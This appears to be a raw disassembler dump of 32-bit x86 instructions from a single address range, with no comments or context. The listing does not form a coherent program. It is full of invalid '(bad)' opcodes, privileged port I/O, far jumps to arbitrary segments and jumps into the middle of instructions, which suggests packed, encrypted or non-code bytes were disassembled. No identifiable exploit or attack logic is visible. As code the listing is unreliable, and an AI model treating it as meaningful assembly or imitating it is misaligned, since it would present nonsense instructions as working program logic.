  41a3e4:	lods   al,BYTE PTR ds:[esi]
  41a3e5:	sub    eax,0xa27ae097
  41a3ea:	aam    0x8e
  41a3ec:	test   al,0xfc
  41a3ee:	add    al,0xe5
  41a3f0:	inc    esi
  41a3f1:	mov    BYTE PTR [eax+0x7bc3b490],dh
  41a3f7:	or     bh,BYTE PTR [ecx+edx*2-0x16b826c9]
  41a3fe:	shr    BYTE PTR [ecx],0x2
  41a401:	push   eax
  41a402:	sub    edx,esp
  41a404:	imul   ecx,DWORD PTR [eax+0x6],0x43626fd7
  41a40b:	xor    eax,0x239d34e3
  41a410:	add    eax,DWORD PTR [eax+0x36a45b0]
  41a416:	popf   
  41a417:	pusha  
  41a418:	xchg   ebp,eax
  41a419:	inc    eax
  41a41a:	jbe    0x41a492
  41a41c:	mov    cs,edx
  41a41e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a41f:	add    edi,eax
  41a421:	jmp    0x41a49b
  41a423:	jmp    0xf881:0xd3ef087e
  41a42a:	fld    TBYTE PTR [eax+0x7b]
  41a42d:	in     eax,0x41
  41a42f:	pop    es
  41a430:	fadd   st(0),st
  41a432:	cmp    BYTE PTR [ebp+0x72],0x19
  41a436:	or     DWORD PTR [edi+0x6018efb4],esi
  41a43c:	sar    DWORD PTR [eax-0xb949bba],1
  41a442:	les    eax,FWORD PTR [ecx+0x1380c050]
  41a448:	xlat   BYTE PTR ds:[ebx]
  41a449:	sbb    bh,BYTE PTR [esi+0xb]
  41a44c:	xor    eax,0xa14c5a14
  41a451:	cmp    eax,0x9df795c6
  41a456:	scas   al,BYTE PTR es:[edi]
  41a457:	jl     0x41a483
  41a459:	mov    WORD PTR [ebp-0x1c],gs
  41a45c:	int3   
  41a45d:	jmp    0xa20e:0xe7702cbb
  41a464:	or     BYTE PTR [edi],ch
  41a466:	ret    
  41a467:	and    eax,0x5341aac4
  41a46c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a46d:	xor    ecx,DWORD PTR [edx]
  41a46f:	aaa    
  41a470:	fild   WORD PTR [edx+edi*2-0x38]
  41a474:	jb     0x41a490
  41a476:	shr    dh,0x8e
  41a479:	sub    BYTE PTR [ebp+0x45],ch
  41a47c:	out    dx,eax
  41a47d:	lods   eax,DWORD PTR ds:[esi]
  41a47e:	xor    ebp,DWORD PTR [edx+0x52]
  41a481:	stc    
  41a482:	adc    eax,0xf0ff93db
  41a487:	xlat   BYTE PTR ds:[ebx]
  41a488:	fild   QWORD PTR [eax+edx*2]
  41a48b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a48c:	gs pop ds
  41a48e:	xor    esp,DWORD PTR [eax-0x33]
  41a491:	test   al,0xcc
  41a493:	popa   
  41a494:	lods   al,BYTE PTR ds:[esi]
  41a495:	and    bl,BYTE PTR [edx+0x49aa177f]
  41a49b:	rol    DWORD PTR [eax+eiz*2],0xc3
  41a49f:	outs   dx,BYTE PTR ds:[esi]
  41a4a0:	pop    edi
  41a4a1:	pop    esi
  41a4a2:	sub    eax,eax
  41a4a4:	and    dl,bh
  41a4a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4a7:	jo     0x41a4b9
  41a4a9:	jmp    0x41a4e7
  41a4ab:	das    
  41a4ac:	jb     0x41a4d1
  41a4ae:	push   ss
  41a4af:	(bad)  
  41a4b0:	mov    eax,0xb289b0c5
  41a4b5:	mov    fs,WORD PTR [ebp-0x2dc9f6b8]
  41a4bb:	dec    edi
  41a4bc:	mov    dl,0xee
  41a4be:	fnsave [esi-0x34]
  41a4c1:	xor    eax,0xafc14be3
  41a4c6:	shr    ah,cl
  41a4c8:	fdivr  QWORD PTR [ecx]
  41a4ca:	je     0x41a466
  41a4cc:	adc    eax,0xef46362c
  41a4d1:	xchg   ebx,eax
  41a4d2:	pop    es
  41a4d3:	xchg   esi,eax
  41a4d4:	fwait
  41a4d5:	mov    edi,0xf65f3ba3
  41a4da:	stc    
  41a4db:	inc    edi
  41a4dc:	xor    BYTE PTR [esi+ebp*8+0x2e582b5f],dl
  41a4e3:	mul    BYTE PTR [edx-0x36ba6082]
  41a4e9:	fild   WORD PTR [esi-0x25469caf]
  41a4ef:	sub    esi,edx
  41a4f1:	ins    DWORD PTR es:[edi],dx
  41a4f2:	jl     0x41a486
  41a4f4:	test   al,0xf7
  41a4f6:	and    cl,BYTE PTR [ecx-0x74]
  41a4f9:	mov    eax,ds:0x99b5407
  41a4fe:	outs   dx,DWORD PTR ds:[esi]
  41a4ff:	sti    
  41a500:	mov    bh,0x4f
  41a502:	mov    DWORD PTR [edi],ecx
  41a504:	cmp    BYTE PTR [ebp-0x400966d9],bl
  41a50a:	xor    bl,BYTE PTR [edi+ecx*8]
  41a50d:	jl     0x41a575
  41a50f:	xchg   ebx,eax
  41a510:	shl    DWORD PTR [edi-0x668d7028],0x96
  41a517:	in     eax,0x7
  41a519:	cmp    BYTE PTR [ebp+0x68ff3fd3],bl
  41a51f:	aaa    
  41a520:	mov    bl,BYTE PTR [eax-0x28796972]
  41a526:	dec    ebx
  41a527:	out    dx,eax
  41a528:	out    0x68,eax
  41a52a:	lock shr DWORD PTR ds:0x82aad185,0xd2
  41a532:	div    BYTE PTR [eax]
  41a534:	or     BYTE PTR [ecx-0x7ec79f48],dl
  41a53a:	pop    esi
  41a53b:	dec    edx
  41a53c:	scas   al,BYTE PTR es:[edi]
  41a53d:	xchg   DWORD PTR [ebp-0x3a],ecx
  41a540:	mov    cl,0x69
  41a542:	and    ecx,DWORD PTR [esi-0x5a4049b7]
  41a548:	loop   0x41a54c
  41a54a:	in     eax,dx
  41a54b:	outs   dx,DWORD PTR ds:[esi]
  41a54c:	inc    esi
  41a54d:	mov    bl,ch
  41a54f:	mov    esp,0xe3d81075
  41a554:	pop    ds
  41a555:	sub    edi,DWORD PTR [edi+0x31]
  41a558:	or     DWORD PTR [eax],ebp
  41a55a:	jp     0x41a55d
  41a55c:	int    0xdb
  41a55e:	jns    0x41a53a
  41a560:	retf   0x460b
  41a563:	test   eax,0x1a3501e0
  41a568:	mov    BYTE PTR [ebp+0x1a],bh
  41a56b:	cli    
  41a56c:	pop    esi
  41a56d:	xor    BYTE PTR [ebp-0x54],cl
  41a570:	jbe    0x41a535
  41a572:	mov    bh,0x7b
  41a574:	std    
  41a575:	push   ebx
  41a576:	mov    al,bh
  41a578:	inc    ebx
  41a579:	gs stos DWORD PTR es:[edi],eax
  41a57b:	pusha  
  41a57c:	out    dx,eax
  41a57d:	mov    DWORD PTR [eax],eax
  41a57f:	imul   ecx,edx,0x2b
  41a582:	push   cs
  41a583:	ins    BYTE PTR es:[edi],dx
  41a584:	mov    dh,0x9c
  41a586:	cdq    
  41a587:	push   ss
  41a588:	fisubr WORD PTR [esi+0x3c]
  41a58b:	(bad)  
  41a58d:	ss pop ss
  41a58f:	xor    bl,BYTE PTR [eax-0x16]
  41a592:	(bad)  
  41a593:	outs   dx,DWORD PTR ds:[esi]
  41a594:	xchg   edx,eax
  41a595:	sub    DWORD PTR [edx+edi*2],ecx
  41a598:	cmp    edi,DWORD PTR [ecx+ebx*4-0x1b6e196e]
  41a59f:	or     esp,DWORD PTR [esi]
  41a5a1:	(bad)  
  41a5a2:	fsub   st,st(2)
  41a5a4:	mov    dh,0x3
  41a5a6:	xchg   esi,eax
  41a5a7:	or     BYTE PTR [eax+esi*8-0x6a1b10e6],dl
  41a5ae:	sub    DWORD PTR [eax+0x3ea96bed],esi
  41a5b4:	pop    ebx
  41a5b5:	dec    ecx
  41a5b6:	jae    0x41a611
  41a5b8:	ret    0x4343
  41a5bb:	xchg   edx,eax
  41a5bc:	inc    ecx
  41a5bd:	xchg   dl,dl
  41a5bf:	xchg   esi,eax
  41a5c0:	inc    eax
  41a5c1:	jle    0x41a601
  41a5c3:	dec    ebx
  41a5c4:	addr16 adc esp,esp
  41a5c7:	jecxz  0x41a57b
  41a5c9:	fsubr  st(2),st
  41a5cb:	fwait
  41a5cc:	ret    0xaaae
  41a5cf:	pushf  
  41a5d0:	mov    bh,0x69
  41a5d2:	pop    eax
  41a5d3:	lahf   
  41a5d4:	imul   ebp,DWORD PTR [esi-0x5245523b],0x55685dbd
  41a5de:	stos   BYTE PTR es:[edi],al
  41a5df:	adc    eax,0x85f2f253
  41a5e4:	push   ds
  41a5e5:	rcl    DWORD PTR [ecx+0x5f],0xff
  41a5e9:	mov    bl,BYTE PTR [eax+0x1f9cd817]
  41a5ef:	out    dx,eax
  41a5f0:	or     eax,0x860f9f72
  41a5f5:	ins    DWORD PTR es:[edi],dx
  41a5f6:	xchg   esi,eax
  41a5f7:	out    dx,eax
  41a5f8:	mov    dh,0x17
  41a5fa:	jbe    0x41a61d
  41a5fc:	iret   
  41a5fd:	jno    0x41a59f
  41a5ff:	icebp  
  41a600:	push   cs
  41a601:	adc    DWORD PTR [ecx+0x29e2b127],0x5fabaa78
  41a60b:	cs cmp eax,0xf48d749d
  41a611:	js     0x41a5f9
  41a613:	xchg   ebp,eax
  41a614:	jbe    0x41a65b
  41a616:	arpl   dx,bx
  41a618:	call   0xd36bb265
  41a61d:	mov    edx,0x158c6b22
  41a622:	xchg   edi,eax
  41a623:	aam    0xdd
  41a625:	or     dh,BYTE PTR [eax+ecx*8-0x3c]
  41a629:	mov    ah,0xea
  41a62b:	hlt    
  41a62c:	inc    esp
  41a62d:	stos   DWORD PTR es:[edi],eax
  41a62e:	stc    
  41a62f:	mov    ah,0x8e
  41a631:	rcl    BYTE PTR [edx+edi*4-0x54],1
  41a635:	adc    ah,bh
  41a637:	dec    esi
  41a638:	add    ecx,DWORD PTR [edi+ecx*8+0x60]
  41a63c:	(bad)  
  41a63d:	xlat   BYTE PTR ds:[ebx]
  41a63e:	nop
  41a63f:	imul   ebp,DWORD PTR [esi],0x2d07e312
  41a645:	inc    esp
  41a646:	scas   eax,DWORD PTR es:[edi]
  41a647:	and    eax,0x412aeffd
  41a64c:	bound  esp,QWORD PTR [ecx-0x3f6d12b8]
  41a652:	push   eax
  41a653:	mov    ecx,0x6664bff0
  41a658:	ret    
  41a659:	hlt    
  41a65a:	add    esp,DWORD PTR [ebp+edx*2+0x18]
  41a65e:	in     eax,dx
  41a65f:	or     al,0x12
  41a661:	adc    ebx,DWORD PTR [esi+0x461d37ad]
  41a667:	sti    
  41a668:	clc    
  41a669:	cli    
  41a66a:	jb     0x41a63c
  41a66c:	push   es
  41a66d:	fwait
  41a66e:	stc    
  41a66f:	push   ebp
  41a670:	and    edi,ebp
  41a672:	inc    edx
  41a673:	inc    ecx
  41a674:	aas    
  41a675:	xor    ecx,ecx
  41a677:	sub    eax,0xff950a28
  41a67c:	iret   
  41a67d:	mov    ds:0x8d5cd163,eax
  41a682:	fwait
  41a683:	std    
  41a684:	rcr    DWORD PTR [esi-0x6fb3205],cl
  41a68a:	and    eax,0x2fd6cc93
  41a68f:	adc    edi,DWORD PTR [edx]
  41a691:	xlat   BYTE PTR ds:[ebx]
  41a692:	pop    ebx
  41a693:	neg    BYTE PTR [eax]
  41a695:	xchg   ebp,eax
  41a696:	push   edi
  41a697:	sbb    al,0xbc
  41a699:	sub    edx,ebx
  41a69b:	imul   ebx,DWORD PTR [ecx],0xffffffa2
  41a69e:	pop    ebx
  41a69f:	jg     0x41a6ac
  41a6a1:	adc    edi,DWORD PTR [ebx+0x79]
  41a6a4:	fsub   st,st(6)
  41a6a6:	scas   eax,DWORD PTR es:[edi]
  41a6a7:	jmp    0x3343:0xbc4425f
  41a6ae:	(bad)  
  41a6af:	xlat   BYTE PTR ds:[ebx]
  41a6b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6b1:	leave  
  41a6b2:	push   ss
  41a6b3:	xor    eax,0x542d43fe
  41a6b8:	xor    al,dh
  41a6ba:	mul    BYTE PTR [edi]
  41a6bc:	push   ss
  41a6bd:	(bad)  
  41a6bf:	sbb    ecx,DWORD PTR [edx]
  41a6c1:	fcom   QWORD PTR [ebp+ecx*2+0x4747638b]
  41a6c8:	inc    ebp
  41a6c9:	jns    0x41a709
  41a6cb:	xor    eax,0x995ad74
  41a6d0:	stos   DWORD PTR es:[edi],eax
  41a6d1:	and    eax,0x9232474c
  41a6d6:	cs (bad) 
  41a6d8:	mov    bh,0xd2
  41a6da:	fiadd  WORD PTR [esi-0x14]
  41a6dd:	in     eax,0x68
  41a6df:	mov    al,0xfa
  41a6e1:	rcl    DWORD PTR [edi+esi*1-0x58],cl
  41a6e5:	pop    edx
  41a6e6:	add    esi,DWORD PTR [ebx+edx*2]
  41a6e9:	jnp    0x41a6c2
  41a6eb:	inc    esi
  41a6ec:	inc    ebp
  41a6ed:	jmp    FWORD PTR [eax]
  41a6ef:	inc    esp
  41a6f0:	pusha  
  41a6f1:	xor    BYTE PTR [ecx],bh
  41a6f3:	push   ss
  41a6f4:	std    
  41a6f5:	or     DWORD PTR [eax+0x7],edx
  41a6f8:	sbb    cl,dh
  41a6fa:	int    0xaf
  41a6fc:	imul   ebp,DWORD PTR [edx-0x53],0x7c22af48
  41a703:	adc    cl,BYTE PTR [ebx]
  41a705:	fbld   TBYTE PTR [ecx-0x36]
  41a708:	fcomp  DWORD PTR [edx-0x4f1d8342]
  41a70e:	(bad)  
  41a70f:	cld    
  41a710:	ss retf 
  41a712:	stos   DWORD PTR es:[edi],eax
  41a713:	(bad)  
  41a714:	sub    al,0x83
  41a716:	dec    eax
  41a717:	xchg   edi,eax
  41a718:	adc    DWORD PTR [ebp+ebp*4-0x7b],0x24e05422
  41a720:	push   ebp
  41a721:	sub    DWORD PTR [esi+0x3a],0xffffff8b
  41a725:	sbb    eax,0x1f1615e6
  41a72a:	pop    esi
  41a72b:	sbb    ebx,DWORD PTR [ebx-0x64]
  41a72e:	mov    ebx,0xd1c6ac3b
  41a733:	push   ebx
  41a734:	adc    BYTE PTR [ebp+0x14ac5ee],ah
  41a73a:	aad    0xd1
  41a73c:	(bad)
  41a740:	aas    
  41a741:	push   ecx
  41a742:	int    0x90
  41a744:	addr16 sti 
  41a746:	sbb    esp,DWORD PTR [esi-0x1d]
  41a749:	sbb    al,0x52
  41a74b:	mov    eax,0x3faae2e
  41a750:	adc    DWORD PTR [ecx],0x60
  41a753:	mov    al,0xc
  41a755:	add    DWORD PTR ds:0xf450c9a2,0x76
  41a75c:	xchg   edi,eax
  41a75d:	in     eax,dx
  41a75e:	xor    ecx,DWORD PTR [ebp+0x3]
  41a761:	pop    ecx
  41a762:	neg    BYTE PTR [ebp+ecx*8-0x38]
  41a766:	into   
  41a767:	test   BYTE PTR [ebp+0x13],ch
  41a76a:	pop    edx
  41a76b:	or     cl,ah
  41a76d:	sub    dl,dh
  41a76f:	ins    BYTE PTR es:[edi],dx
  41a770:	jmp    0x9ff0:0x3243b6ca
  41a777:	pop    esi
  41a778:	cli    
  41a779:	test   al,0x87
  41a77b:	mov    ebx,0xb973dce6
  41a780:	push   ebx
  41a781:	ror    DWORD PTR [esi],1
  41a783:	dec    esi
  41a784:	dec    esp
  41a785:	mov    edx,0x4d616cac
  41a78a:	jne    0x41a766
  41a78c:	jp     0x41a742
  41a78e:	scas   eax,DWORD PTR es:[edi]
  41a78f:	mov    eax,DWORD PTR [eax+eax*8+0x104ebb13]
  41a796:	add    al,0x61
  41a798:	call   0x11c312a7
  41a79d:	stc    
  41a79e:	sbb    DWORD PTR [edi-0x42],0x192f00e3
  41a7a5:	imul   ebx,DWORD PTR [ebp+0x2e],0xfffffff7
  41a7a9:	dec    esi
  41a7aa:	test   DWORD PTR [ebp-0x6a],0x87fd812b
  41a7b1:	jl     0x41a74f
  41a7b3:	ins    BYTE PTR es:[edi],dx
  41a7b4:	test   ch,ch
  41a7b6:	sahf   
  41a7b7:	stos   DWORD PTR es:[edi],eax
  41a7b8:	sbb    eax,DWORD PTR [edi]
  41a7ba:	cwde   
  41a7bb:	gs and eax,0x1ca02b80
  41a7c1:	in     eax,0x33
  41a7c3:	icebp  
  41a7c4:	xor    al,0x33
  41a7c6:	and    DWORD PTR [edi-0x43168d27],0xffffffa0
  41a7cd:	in     eax,dx
  41a7ce:	test   edx,esi
  41a7d0:	mov    DWORD PTR [esi-0x3c672adf],edi
  41a7d6:	dec    edx
  41a7d7:	dec    edi
  41a7d8:	out    0xe9,eax
  41a7da:	adc    esi,esp
  41a7dc:	xchg   esp,eax
  41a7dd:	jmp    0x41a7ff
  41a7df:	sbb    al,0x6b
  41a7e1:	xor    BYTE PTR [ebx+eax*8-0x5ab0b722],al
  41a7e8:	je     0x41a7e3
  41a7ea:	sub    al,0x97
  41a7ec:	jbe    0x41a7dc
  41a7ee:	mov    bl,0xa2
  41a7f0:	pop    ebx
  41a7f1:	jg     0x41a785
  41a7f3:	jno    0x41a7e8
  41a7f5:	mov    BYTE PTR [ecx+0x1a],cl
  41a7f8:	mov    esi,edx
  41a7fa:	fnstenv [edi-0x41]
  41a7fd:	push   cs
  41a7fe:	jne    0x41a7e7
  41a800:	out    dx,al
  41a801:	in     eax,0xda
  41a803:	sbb    al,0x15
  41a805:	aam    0x9a
  41a807:	outs   dx,DWORD PTR ds:[esi]
  41a808:	out    0xb6,al
  41a80a:	(bad)  
  41a80b:	das    
  41a80c:	int3   
  41a80d:	adc    DWORD PTR [ebx+0xf],0xfffffff9
  41a811:	and    BYTE PTR [edi],ch
  41a813:	push   edi
  41a814:	and    BYTE PTR [esi-0x7],0x7b
  41a818:	test   DWORD PTR [eax],ebx
  41a81a:	lods   al,BYTE PTR ds:[esi]
  41a81b:	mov    cl,BYTE PTR ds:0x12b6f024
  41a821:	and    bl,BYTE PTR [edx+0x7b3e3711]
  41a827:	stos   BYTE PTR es:[edi],al
  41a828:	(bad)  
  41a829:	shr    DWORD PTR [ebp-0x69],cl
  41a82c:	fcmovbe st,st(2)
  41a82e:	or     eax,0xfc50ab68
  41a833:	sub    al,0xeb
  41a835:	aad    0xeb
  41a837:	enter  0xab60,0x99
  41a83b:	lods   al,BYTE PTR ds:[esi]
  41a83c:	mov    edx,0x75739346
  41a841:	in     al,0xaa
  41a843:	daa    
  41a844:	cmp    al,0x1
  41a846:	xchg   DWORD PTR [edi],ebp
  41a848:	mov    ch,0xaa
  41a84a:	das    
  41a84b:	repz push esp
  41a84d:	or     ah,dl
  41a84f:	add    ebx,DWORD PTR [esi-0x2e]
  41a852:	inc    esp
  41a853:	xor    eax,ebx
  41a855:	loope  0x41a84e
  41a857:	daa    
  41a858:	icebp  
  41a859:	inc    esi
  41a85a:	xor    BYTE PTR [edx],al
  41a85c:	stos   DWORD PTR es:[edi],eax
  41a85d:	js     0x41a8d6
  41a85f:	scas   eax,DWORD PTR es:[edi]
  41a860:	inc    edx
  41a861:	outs   dx,BYTE PTR ds:[esi]
  41a862:	aad    0x76
  41a864:	sbb    DWORD PTR [esi-0x779c7c7],esp
  41a86a:	sub    al,0x54
  41a86c:	mov    es,WORD PTR [edx]
  41a86e:	call   0xf8eb:0x96c2dd9
  41a875:	push   cs
  41a876:	adc    DWORD PTR [eax+0x3aa0f668],esp
  41a87c:	test   DWORD PTR [edx],esp
  41a87e:	test   dl,ah
  41a880:	outs   dx,DWORD PTR ds:[esi]
  41a881:	outs   dx,DWORD PTR ds:[esi]
  41a882:	rcr    ah,0xe6
  41a885:	sbb    eax,0x7ce649a4
  41a88a:	or     DWORD PTR [edi-0x48],ebx
  41a88d:	nop
  41a88e:	sub    dl,BYTE PTR [edx-0x4627ec6d]
  41a894:	out    0x72,al
  41a896:	push   ss
  41a897:	fwait
  41a898:	adc    DWORD PTR [ecx-0x2c],eax
  41a89b:	adc    edi,ecx
  41a89d:	jo     0x41a8eb
  41a89f:	and    bl,BYTE PTR [eax]
  41a8a1:	mov    esi,0x8a7557c8
  41a8a6:	js     0x41a84c
  41a8a8:	cwde   
  41a8a9:	xor    ecx,DWORD PTR [eax]
  41a8ab:	int3   
  41a8ac:	shl    ebp,cl
  41a8ae:	cdq    
  41a8af:	fcom   QWORD PTR [ebx]
  41a8b1:	sti    
  41a8b2:	mov    ds:0xa39f2a23,al
  41a8b7:	dec    DWORD PTR [edi-0x4a]
  41a8ba:	xchg   DWORD PTR [ebx],eax
  41a8bc:	fist   WORD PTR [edi+ebx*1]
  41a8bf:	lea    esi,[edx+edx*8-0x59]
  41a8c3:	dec    edx
  41a8c4:	js     0x41a89d
  41a8c6:	retf   0x34a8
  41a8c9:	ss jb  0x41a91c
  41a8cc:	push   ebp
  41a8cd:	mov    esp,DWORD PTR [ecx-0x651f6ba0]
  41a8d3:	xchg   esi,eax
  41a8d4:	mov    DWORD PTR [edi-0x6],eax
  41a8d7:	adc    edi,DWORD PTR [edx+eiz*1-0xb]
  41a8db:	or     DWORD PTR fs:[esi+0x60],ecx
  41a8df:	das    
  41a8e0:	call   DWORD PTR [ebp-0x61]
  41a8e3:	(bad)  
  41a8e4:	test   ebx,0x1cb73767
  41a8ea:	inc    edx
  41a8eb:	sub    cl,BYTE PTR [eax-0x2c]
  41a8ee:	sub    eax,0x4deec7f6
  41a8f3:	mov    ebx,0x1cde10e1
  41a8f8:	test   eax,0xa65b2c2c
  41a8fd:	pop    ds
  41a8fe:	fsubr  DWORD PTR [edx-0x234ebaac]
  41a904:	mov    bh,0x27
  41a906:	dec    ecx
  41a907:	retf   0xcf49
  41a90a:	jb     0x41a91c
  41a90c:	pop    edi
  41a90d:	add    DWORD PTR [ecx+0x3e11a884],ebx
  41a913:	(bad)  
  41a915:	dec    ebp
  41a916:	fwait
  41a917:	es cmp eax,0xdffc45db
  41a91d:	push   ebx
  41a91e:	pop    ss
  41a91f:	mov    dl,0xdb
  41a921:	shr    DWORD PTR [ebx+0xdcf76de],0xc6
  41a928:	out    dx,eax
  41a929:	mov    al,ds:0x6a6465d1
  41a92e:	test   eax,0xad12a4b8
  41a933:	mov    ch,0xa3
  41a935:	inc    ebx
  41a936:	xor    al,0x49
  41a938:	push   0x32ab3ae
  41a93d:	(bad)  
  41a93e:	loop   0x41a9a9
  41a940:	mov    ds:0xffbbdcc9,eax
  41a945:	push   edx
  41a946:	inc    edx
  41a947:	pop    edi
  41a948:	or     eax,0x37be9616
  41a94d:	(bad)  
  41a94f:	sbb    al,0xa4
  41a951:	or     al,0xa0
  41a953:	jo     0x41a95e
  41a955:	sub    eax,0xf1a8b48c
  41a95a:	shl    DWORD PTR [ebx],1
  41a95c:	jo     0x41a909
  41a95e:	pop    eax
  41a95f:	into   
  41a960:	sub    DWORD PTR [ebx+ebx*1],edi
  41a963:	into   
  41a964:	xor    BYTE PTR es:[ebp+0x372dab3f],bh
  41a96b:	dec    eax
  41a96c:	fdivr  st,st(2)
  41a96e:	sahf   
  41a96f:	js     0x41a9a4
  41a971:	jp     0x41a906
  41a973:	std    
  41a974:	jae    0x41a95e
  41a976:	pop    esp
  41a977:	jl     0x41a926
  41a979:	fidiv  WORD PTR [ebx+0x59]
  41a97c:	leave  
  41a97d:	test   DWORD PTR [edx+ebx*2-0x20cc78b1],ecx
  41a984:	dec    edx
  41a985:	dec    ecx
  41a986:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a987:	dec    ebp
  41a988:	stc    
  41a989:	push   0x6
  41a98b:	push   es
  41a98c:	fist   DWORD PTR [eax]
  41a98e:	xor    BYTE PTR gs:[edx+eiz*8+0x535473c8],dl
  41a996:	xchg   edi,eax
  41a997:	retf   0xaae4
  41a99a:	and    al,0x29
  41a99c:	mov    esi,0x4fc787aa
  41a9a1:	cmp    DWORD PTR [edi+0x2a],eax
  41a9a4:	dec    edx
  41a9a5:	retf   0x20d4
  41a9a8:	(bad)  
  41a9a9:	cmp    esi,ebp
  41a9ab:	jmp    0x63834485
  41a9b0:	jg     0x41a9fb
  41a9b2:	push   0x6a
  41a9b4:	add    edx,DWORD PTR [ebx+0x2c5ffefe]
  41a9ba:	sti    
  41a9bb:	fcmovne st,st(0)
  41a9bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9be:	adc    al,0x8d
  41a9c0:	and    DWORD PTR [ebx],ebx
  41a9c2:	cwde   
  41a9c3:	cmp    BYTE PTR [ebp-0x77],cl
  41a9c6:	shl    BYTE PTR [edi],1
  41a9c8:	out    0xe,eax
  41a9ca:	dec    ecx
  41a9cb:	xchg   edx,eax
  41a9cc:	push   edx
  41a9cd:	adc    ecx,0x50
  41a9d0:	dec    eax
  41a9d1:	mov    ds:0x6b2d54af,eax
  41a9d6:	call   0xa2af14e9
  41a9db:	mov    dl,0x7
  41a9dd:	(bad)  
  41a9de:	popa   
  41a9df:	and    eax,0x7d79e42c
  41a9e4:	mov    cl,0x51
  41a9e6:	push   ds
  41a9e7:	cmp    dh,BYTE PTR [ecx]
  41a9e9:	add    DWORD PTR [esi],eax
  41a9eb:	and    ebp,DWORD PTR [esi]
  41a9ed:	mov    ah,0x67
  41a9ef:	sbb    dh,BYTE PTR [eax+0xe7cfdd3]
  41a9f5:	dec    eax
  41a9f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9f7:	mov    edx,0x222a477a
  41a9fc:	popa   
  41a9fd:	push   0x4c
  41a9ff:	and    esi,ebx
  41aa01:	or     eax,0x579ede1a
  41aa06:	icebp  
  41aa07:	fidivr WORD PTR [edx+0x7d]
  41aa0a:	mov    eax,0x34298b7b
  41aa0f:	outs   dx,BYTE PTR ds:[esi]
  41aa10:	mov    eax,ds:0xa63a941f
  41aa15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa16:	mov    ds:0x2db7ec67,al
  41aa1b:	dec    ecx
  41aa1c:	aas    
  41aa1d:	sti    
  41aa1e:	fstp   TBYTE PTR [esi-0x1b]
  41aa21:	jb     0x41aa07
  41aa23:	mov    bl,0x13
  41aa25:	ret    0x86f1
  41aa28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa29:	push   cs
  41aa2a:	jae    0x41aaa7
  41aa2c:	ret    0xfdab
  41aa2f:	sub    eax,0xb310766c
  41aa34:	arpl   WORD PTR [eax],di
  41aa36:	aam    0x10
  41aa38:	or     al,ch
  41aa3a:	xchg   esp,eax
  41aa3b:	lea    ebx,ds:0x2888d67f
  41aa41:	jae    0x41aa35
  41aa43:	jg     0x41aa7a
  41aa45:	test   al,0x71
  41aa47:	inc    ecx
  41aa48:	pop    es
  41aa49:	call   0xc975:0x3be55962
  41aa50:	pop    esi
  41aa51:	add    BYTE PTR [edx+ecx*1+0x52d8dbe9],bl
  41aa58:	cs out dx,al
  41aa5a:	add    al,cl
  41aa5c:	sub    BYTE PTR [esi-0x4a],ch
  41aa5f:	mov    edx,DWORD PTR [ebp+ebx*8+0x77]
  41aa63:	or     eax,0x60c69bbf
  41aa68:	cmp    bl,ah
  41aa6a:	pop    ebx
  41aa6b:	cmp    al,0xf0
  41aa6d:	mov    al,ds:0xab3fac27
  41aa72:	shl    BYTE PTR [eax+0x0],cl
  41aa75:	dec    edi
  41aa76:	pop    ds
  41aa77:	mul    BYTE PTR [edi+0x57cda87b]
  41aa7d:	ror    bl,1
  41aa7f:	jmp    0x41aafd
  41aa81:	dec    esi
  41aa82:	xchg   edx,eax
  41aa83:	push   ss
  41aa84:	aaa    
  41aa85:	mov    ch,0xc
  41aa87:	xlat   BYTE PTR ds:[ebx]
  41aa88:	push   ebp
  41aa89:	popf   
  41aa8a:	mov    al,0xff
  41aa8c:	inc    edx
  41aa8d:	jp     0x41aa27
  41aa8f:	pusha  
  41aa90:	scas   eax,DWORD PTR es:[edi]
  41aa91:	gs jle 0x41aa80
  41aa94:	jns    0x41aa39
  41aa96:	jge    0x41aa83
  41aa98:	dec    eax
  41aa99:	push   esp
  41aa9a:	das    
  41aa9b:	add    edx,DWORD PTR [ebx-0x6261f764]
  41aaa1:	inc    ecx
  41aaa2:	inc    edi
  41aaa3:	add    edx,esp
  41aaa5:	dec    ebx
  41aaa7:	les    esp,FWORD PTR [edi+ebx*8]
  41aaaa:	sbb    eax,0x2d
  41aaad:	sbb    DWORD PTR [ecx+0x51],esi
  41aab0:	fmul   QWORD PTR [ebx-0xf]
  41aab3:	mul    BYTE PTR [edx]
  41aab5:	xchg   edi,eax
  41aab6:	mov    ebx,0x904c28ee
  41aabb:	jbe    0x41ab28
  41aabd:	popf   
  41aabe:	xchg   ecx,eax
  41aabf:	inc    ebp
  41aac0:	outs   dx,BYTE PTR ds:[esi]
  41aac1:	mov    edx,0x7be00e4f
  41aac6:	fcmovnu st,st(6)
  41aac8:	popa   
  41aac9:	and    ecx,0xc
  41aacc:	add    dh,ch
  41aace:	rcr    ch,0x21
  41aad1:	fwait
  41aad2:	out    dx,al
  41aad3:	lods   eax,DWORD PTR ds:[esi]
  41aad4:	jb     0x41ab1e
  41aad6:	(bad)  [edx+0xcb4d90a]
  41aadc:	leave  
  41aadd:	dec    edx
  41aade:	out    0x21,eax
  41aae0:	popf   
  41aae1:	mov    BYTE PTR [edx],dh
  41aae3:	repz inc eax
  41aae5:	cmp    ecx,ecx
  41aae7:	jl     0x41aacd
  41aae9:	inc    esp
  41aaea:	daa    
  41aaeb:	int    0x1d
  41aaed:	enter  0x336,0x1f
  41aaf1:	xchg   ebp,eax
  41aaf2:	nop
  41aaf3:	xchg   al,dl
  41aaf5:	outs   dx,DWORD PTR ds:[esi]
  41aaf6:	rol    al,cl
  41aaf8:	mov    ebp,DWORD PTR [esi]
  41aafa:	arpl   sp,ax
  41aafc:	mov    eax,ds:0xa1911152
  41ab01:	mov    esp,0xaecf4cc
  41ab06:	into   
  41ab07:	cs xchg edi,eax
  41ab09:	push   ebx
  41ab0a:	outs   dx,DWORD PTR ds:[esi]
  41ab0b:	ja     0x41aaa6
  41ab0d:	mov    ebp,DWORD PTR [ebx]
